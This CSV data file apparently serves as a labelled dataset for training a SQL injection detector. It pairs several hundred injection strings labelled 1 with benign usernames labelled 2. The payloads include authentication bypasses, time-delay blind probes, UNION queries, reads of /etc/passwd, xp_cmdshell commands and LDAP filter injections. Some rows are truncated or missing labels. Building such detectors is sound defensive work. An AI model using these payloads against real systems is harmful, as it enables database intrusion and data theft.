query,label
"admin"" or 1=1",1
"admin"" or 1=1#",1
"admin"" or 1=1--",1
"admin"" or 1=1/*",1
"admin"") or ""1""=""1",1
"admin"") or ""1""=""1""#",1
"admin"") or ""1""=""1""--",1
"admin"") or ""1""=""1""/*",1
"admin"") or (""1""=""1",1
"admin"") or (""1""=""1""#",1
"admin"") or (""1""=""1""--",1
"admin"") or (""1""=""1""/*",1
"admin""/*",1
"admin""or 1=1 or """"=""",1
admin' #,1
admin' --,1
admin' or '1'='1,1
admin' or '1'='1'#,1
admin' or '1'='1'--,1
admin' or '1'='1'/*,1
admin' or 1=1,1
admin' or 1=1#,1
admin' or 1=1--,1
admin' or 1=1/*,1
admin') or '1'='1,1
admin') or '1'='1'#,1
admin') or '1'='1'--,1
admin') or '1'='1'/*,1
admin') or ('1'='1,1
admin') or ('1'='1'#,1
admin') or ('1'='1'--,1
admin') or ('1'='1'/*,1
admin'/*,1
admin'or 1=1 or ''=',1
or 1=1,1
or 1=1#,1
or 1=1--,1
or 1=1/*,1
"root"" #",1
"root"" --",1
"root"" or ""1""=""1",1
"root"" or ""1""=""1""#",1
"root"" or ""1""=""1""--",1
"root"" or ""1""=""1""/*",1
"root"" or 1=1",1
"root"" or 1=1 or """"=""",1
"root"" or 1=1#",1
"root"" or 1=1--",1
"root"" or 1=1/*",1
"root"") or ""1""=""1",1
"root"") or ""1""=""1""#",1
"root"") or ""1""=""1""--",1
"root"") or ""1""=""1""/*",1
"root"") or (""1""=""1",1
"root"") or (""1""=""1""#",1
"root"") or (""1""=""1""--",1
"root"") or (""1""=""1""/*",1
"root""/*",1
root' #,1
root' --,1
root' or '1'='1,1
root' or '1'='1'#,1
root' or '1'='1'--,1
root' or '1'='1'/*,1
root' or 1=1,1
root' or 1=1#,1
root' or 1=1--,1
root' or 1=1/*,1
root') or '1'='1,1
root') or '1'='1'#,1
root') or '1'='1'--,1
root') or '1'='1'/*,1
root') or ('1'='1,1
root') or ('1'='1'#,1
root') or ('1'='1'--,1
root') or ('1'='1'/*,1
root'/*,1
root'or 1=1 or ''=',1
)%20or%20('x'='x,1
%20or%201=1,1
; execute immediate 'sel' || 'ect us' || 'er',1
"benchmark(10000000,MD5(1))#",1
update,1
";waitfor delay '0:0:__TIME__'--
1) or pg_sleep(__TIME__)--
||(elt(-3+5,bin(15),ord(10),hex(char(45))))
hi"""") or (""""a""""=""""a""",1
delete,1
like,1
" or sleep(__TIME__)#
pg_sleep(__TIME__)--
*(|(objectclass=*))
declare @q nvarchar (200) 0x730065006c00650063 ...
 or 0=0 #
insert
1) or sleep(__TIME__)#
) or ('a'='a
; exec xp_regread
*|
@var select @var as var into temp end --
1)) or benchmark(10000000,MD5(1))#
asc
(||6)
a"""" or 3=3--""",1
" or benchmark(10000000,MD5(1))#
# from wapiti
 or 0=0 --
1 waitfor delay '0:0:10'--
 or 'a'='a
hi or 1=1 --",1
or a = a,1
UNION ALL SELECT,1
) or sleep(__TIME__)=',1
")) or benchmark(10000000,MD5(1))#",1
hi' or 'a'='a,1
21 %,1
limit,1
or 1=1,1
or 2 > 1,1
")) or benchmark(10000000,MD5(1))#
PRINT
hi') or ('a'='a
 or 3=3
));waitfor delay '0:0:__TIME__'--
a' waitfor delay '0:0:10'--
1;(load_file(char(47,101,116,99,47,112,97,115, ...
or%201=1
1 or sleep(__TIME__)#
or 1=1
 and 1 in (select var from temp)--
 or '7659'='7659
 or 'text' = n'text'
 --
 or 1=1 or ''='
declare @s varchar (200) select @s = 0x73656c6 ...
exec xp
; exec master..xp_cmdshell 'ping 172.10.1.255'--
3.10E+17
 or pg_sleep(__TIME__)--",1
x' AND email IS NULL; --,1
&,1
admin' or ',1
or 'unusual' = 'unusual',1
//,1
truncate,1
"1) or benchmark(10000000,MD5(1))#",1
\x27UNION SELECT,1
declare @s varchar(200) select @s = 0x77616974 ...,1
tz_offset,1
sqlvuln,1
"));waitfor delay '0:0:__TIME__'--
||6
or%201=1 --
%2A%28%7C%28objectclass%3D%2A%29%29
or a=a
) union select * from information_schema.tables;
PRINT @@variable
or isNULL(1/0) /*
26 %
 or ""a""=""a",1
(sqlvuln),1
x' AND members.email IS NULL; --,1
or 1=1--,1
"and 1=( if((load_file(char(110,46,101,120,11 ...",1
0x770061006900740066006F0072002000640065006C00 ...,1
%20'sleep%2050',1
as,1
1)) or pg_sleep(__TIME__)--,1
/**/or/**/1/**/=/**/1,1
union all select @@version--,1
",@variable",1
(sqlattempt2),1
or (EXISTS),1
t'exec master..xp_cmdshell 'nslookup www.googl ...,1
%20$(sleep%2050),1
"1 or benchmark(10000000,MD5(1))#",1
%20or%20''=',1
||UTL_HTTP.REQUEST,1
or pg_sleep(__TIME__)--,1
hi' or 'x'='x';,1
) or sleep(__TIME__)=,1
or 'whatever' in ('whatever'),1
; begin declare @var varchar(8000) set @var=' ...,1
"union select 1,load_file('/etc/passwd'),1,1,1;",1
0x77616974666F722064656C61792027303A303A313027 ...,1
exec(@s),1
) or pg_sleep(__TIME__)--,1
union select,1
or sleep(__TIME__)#,1
select * from information_schema.tables--,1
a' or 1=1--,1
a' or 'a' = 'a,1
declare @s varchar(22) select @s =,1
or 2 between 1 and 3,1
or a=a--,1
or '1'='1,1
|,1
or sleep(__TIME__)=',1
or 1 --',1
"or 0=0 #""",1
having,1
a',1
" or isNULL(1/0) /*
declare @s varchar (8000) select @s = 0x73656c ...
 or 1=1 --
char%4039%41%2b%40SELECT
order by
bfilename
 having 1=1--
) or benchmark(10000000,MD5(1))#
 or username like char(37);
;waitfor delay '0:0:__TIME__'--
 or 1=1--",1
x' AND userid IS NULL; --,1
*/*,1
or 'text' > 't',1
(select top 1,1
"or benchmark(10000000,MD5(1))#",1
");waitfor delay '0:0:__TIME__'--
a' or 3=3--
 -- &password=
 group by userid having 1=1--
 or ''='
; exec master..xp_cmdshell
%20or%20x=x
select
)) or sleep(__TIME__)=""",1
0x730065006c0065006300740020004000400076006500 ...,1
hi' or 1=1 --,1
UNION SELECT,1
%2A%28%7C%28mail%3D%2A%29%29,1
or 1=1 /*,1
)) or sleep(__TIME__)=',1
"or 1=1 or """"=",1
or 1 in (select @@version)--,1
sqlvuln;,1
union select * from users where login = char ...,1
x' or 1=1 or 'x'='y,1
28 %,1
 or 3=3 --,1
@variable,1
or '1'='1'--,1
"a"" or 1=1--",1
//*,1
%2A%7C,1
" or 0=0 --
)) or pg_sleep(__TIME__)--",1
?,1
or 1/*,1
!,1
or a = a,1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1
 or 1=1,1
 or 1=1 --,1
x' OR full_name LIKE '%Bob%,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
%20or%20''=',1
%20or%20'x'='x,1
)%20or%20('x'='x,1
 or 0=0 --,1
 or 0=0 #,1
"or 0=0 #""",1
 or 1=1--,1
 or '1'='1'--,1
 or 1 --',1
or 1=1--,1
 or 1=1 or ''=',1
"or 1=1 or """"=",1
 or a=a--,1
or a=a,1
) or ('a'='a,1
hi' or 'x'='x';,1
or,1
procedure,1
handler,1
 or username like '%,1
 or uname like '%,1
 or userid like '%,1
 or uid like '%,1
 or user like '%,1
; exec master..xp_cmdshell,1
; exec xp_regread,1
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
--sp_password,1
 UNION SELECT,1
 UNION ALL SELECT,1
 or (EXISTS),1
 (select top 1,1
||UTL_HTTP.REQUEST,1
1;SELECT%20*,1
"<>""'%;)(&+",1
%20or%201=1,1
 or ''=',1
 or 3=3,1
 or 3=3 --,1
sandie,2
agace,2
cindra,2
damaris,2
darry,2
claretta,2
chrysa,2
rosamund,2
zouheir,2
clo,2
deacon,2
chris,2
rozamond,2
zoenka,2
christophe,2
ikram,2
roxane,2
ila,2
xuong,2
adda,2
cornelius,2
vivyanne,2
salis,2
idus,2
sandra,2
darragh,2
darya,2
wally,2
aida,2
christyna,2
ajay,2
deborah,2
ruthann,2
adalia,2
zarah,2
adelle,2
hwei-ling,2
rosabella,2
adelaida,2
debbi,2
rui-yuan,2
waichi,2
davinder,2
constancy,2
dean,2
huan-yu,2
zeph,2
chung-yo,2
hulst,2
sami,2
wee-seng,2
christy,2
aaliyah,2
corrine,2
rydel,2
colleen,2
darci,2
cierra,2
darlleen,2
addilyn,2
chet,2
wassim,2
weitzel,2
christie,2
alanah,2
cheyenne,2
zero,2
dash,2
damian,2
walliw,2
cici,2
adelice,2
clio,2
dannie,2
yvonne,2
ciel,2
zorine,2
chinfui,2
codee,2
dania,2
irving,2
salaidh,2
cindee,2
vradmin,2
crispin,2
clarissa,2
irene,2
darryl,2
yasmina,2
hyacintha,2
clarice,2
rozalia,2
clover,2
rupert,2
davion,2
zeina,2
abbie,2
abagael,2
agnes,2
weilin,2
cynthy,2
zayn,2
abdalla,2
wai,2
sara,2
hui,2
adnan,2
roselia,2
ryley,2
zdenek,2
zehir-charlie,2
aile,2
zdenko,2
igor,2
ivory,2
agathe,2
row,2
ag,2
sandy,2
zarella,2
ros,2
rubi,2
ignace,2
danni,2
irina,2
hpone,2
hudson,2
warwick,2
huub,2
ilona,2
chlo,2
claude,2
corie,2
ruperta,2
clancy,2
clifton,2
ian,2
zere,2
adriena,2
rozelle,2
zadie,2
colby,2
zulema,2
cordey,2
ainsleigh,2
iris,2
ruthanne,2
wendeline,2
cris,2
yate,2
chi-vien,2
aaren,2
sadru,2
darrelle,2
irena,2
cosetta,2
rosa,2
cinnamon,2
zuzana,2
ineke,2
isidora,2
corey,2
huw,2
rosalie,2
adara,2
vu,2
rudolph,2
costas-dinos,2
cheuk,2
cherlyn,2
root,2
ching-long,2
adi,2
sanae,2
abahri,2
colton,2
zoran,2
yara,2
chicky,2
zsazsa,2
clovis,2
yee-ning,2
debee,2
iona,2
access,2
cuong,2
court,2
cynthie,2
roupen,2
aeriel,2
claresta,2
iliana,2
hubert,2
cheri,2
cortland,2
damarion,2
cymbre,2
ruthy,2
zelda,2
abbye,2
corine,2
daina,2
isl,2
aimee,2
zita,2
cyndia,2
wendye,2
adrien,2
cody,2
crysta,2
alanna,2
cordy,2
rosita,2
ross,2
sal,2
collette,2
dayna,2
rosmunda,2
cia,2
sandrine,2
wandis,2
ru,2
hynek,2
iain,2
wenona,2
action,2
zeke,2
concordia,2
deane,2
adina,2
abbi,2
wileen,2
inna,2
coral,2
christopher,2
zed,2
cynthea,2
aby,2
accounting,2
wanids,2
samuel,2
sanjeev,2
zbignew,2
housseini,2
darren,2
akio,2
zalee,2
cho-kuen,2
ahmet,2
wenonah,2
adore,2
samual,2
wannell,2
cristin,2
rozanne,2
ainslee,2
ieystn,2
wendi,2
aislynn,2
iormina,2
crystalbay,2
ingemar,2
corena,2
inam,2
yukinobu,2
ainsley,2
darcy,2
corri,2
waneta,2
cyrine,2
cornie,2
dahlia,2
chuan,2
cicely,2
vonda,2
xuan-lien,2
vmchange,2
saira,2
adella,2
sally,2
yasmin,2
coleman,2
akira,2
alannah,2
coriss,2
aileen,2
abrianna,2
vrinda,2
adan,2
weston,2
adonis,2
samaria,2
yih,2
conway,2
corrinne,2
chesteen,2
zander,2
cthrine,2
dedie,2
yuksel,2
alayne,2
achal,2
zuriel,2
acacia,2
imani,2
cortney,2
cherish,2
corliss,2
roxi,2
aili,2
corissa,2
datha,2
illinois,2
ruud,2
irma,2
ira,2
ddene,2
cristie,2
zbigniew,2
cornela,2
ieuan,2
claudette,2
wallie,2
clemmie,2
wenxi,2
constantina,2
isabeau,2
alane,2
zaheera,2
clem,2
ace,2
zak,2
ryan,2
colly,2
isadora,2
yalonda,2
advance,2
clifford,2
rosanna,2
sade,2
aerona,2
cheng,2
irita,2
cuthbert,2
crawford,2
whitfield,2
rubetta,2
abree,2
vlad,2
codi,2
clemence,2
abbe,2
hugo,2
dawson,2
ishmael,2
deana,2
dawna,2
yusuf,2
sabah,2
darla,2
wendie,2
conor,2
sarene,2
isis,2
clodagh,2
darius,2
adri,2
christal,2
cordula,2
colette,2
dariel,2
how,2
alaine,2
saraann,2
salah,2
humberto,2
inquire,2
dede,2
ciriaco,2
sandi,2
abdallah,2
weber,2
deedee,2
adriane,2
chrissie,2
zendaya,2
rozele,2
dabria,2
chin,2
yulissa,2
viviyan,2
cressida,2
rubia,2
yvette,2
hotline,2
vuquoc,2
collie,2
zeth,2
rylie,2
rusty,2
daveen,2
adrianne,2
ike,2
inderjit,2
weiping,2
chiquia,2
rosario,2
daphna,2
saige,2
daffi,2
yestin,2
cristi,2
daphne,2
yelena,2
coralyn,2
aisling,2
zahid,2
iseabal,2
cindi,2
afke,2
wade,2
wieslawa,2
adalyn,2
vonni,2
claus,2
isahella,2
core,2
cho-lun,2
idell,2
wendell,2
colman,2
dacia,2
daragh,2
salvatore,2
ileana,2
corinna,2
yessica,2
zea,2
vlado,2
achamma,2
zygmunt,2
agnola,2
zaiden,2
idaline,2
damita,2
icy,2
rudie,2
clementia,2
saeed,2
said,2
cherin,2
rylee,2
yazmin,2
christelle,2
chun,2
cyrus,2
rosalia,2
roz,2
daxter,2
zara,2
dara,2
issie,2
ivonne,2
adelynn,2
zein,2
sabra,2
yen,2
cleveland,2
chung,2
chitra,2
dane,2
zabrina,2
huxley,2
alameda,2
ijff,2
darina,2
zafar,2
dawn,2
sameh,2
cornelis,2
agretha,2
darb,2
zaine,2
iva,2
chryste,2
zelma,2
colli,2
cloe,2
de-anna,2
vo,2
clint,2
cosimo,2
daron,2
cyndy,2
isabella,2
claribel,2
alaina,2
chung-wo,2
sara-ann,2
sanja,2
hq,2
aislinn,2
yalcin,2
afif,2
agnesse,2
air,2
craig,2
dani,2
saied,2
debora,2
sammy,2
corina,2
imelda,2
ciara,2
adriel,2
cristiane,2
cristian,2
cissy,2
saman,2
vyky,2
abia,2
issi,2
cynthia,2
abdul,2
ishan,2
salim,2
dacey,2
ailina,2
addi,2
sales,2
zainab,2
roxy,2
ailsa,2
iolanthe,2
immy,2
clemie,2
dana,2
rozlynn,2
wieslaw,2
ruth,2
huck,2
ruairi,2
cristobal,2
ivy,2
aimil,2
abra,2
sadan,2
ibrahim,2
constantia,2
isabelita,2
ruchel,2
chok,2
imogen,2
zeljko,2
huy,2
rosanne,2
chen-jung,2
huong,2
ciaran,2
ifti,2
walton,2
sapphira,2
zahra,2
sabrina,2
christabella,2
ilyse,2
sarette,2
davis,2
daisie,2
wai-hung,2
ruby,2
cherie,2
chungsik,2
concetta,2
cycelia,2
ivan,2
dario,2
agenia,2
waja,2
cristal,2
roxie,2
imtaz,2
rudolf,2
danella,2
ivana,2
darian,2
adele,2
iteke,2
agnese,2
zanni,2
salomi,2
connor,2
sandro,2
walley,2
wil,2
admin,2
yao,2
christalle,2
chrysanthemum,2
inesita,2
cosette,2
damien,2
danna,2
salome,2
hyacinth,2
datas,2
christer,2
afzal,2
rufus,2
zahara,2
ignacio,2
rosetta,2
chevy,2
corra,2
cynthya,2
chye-lian,2
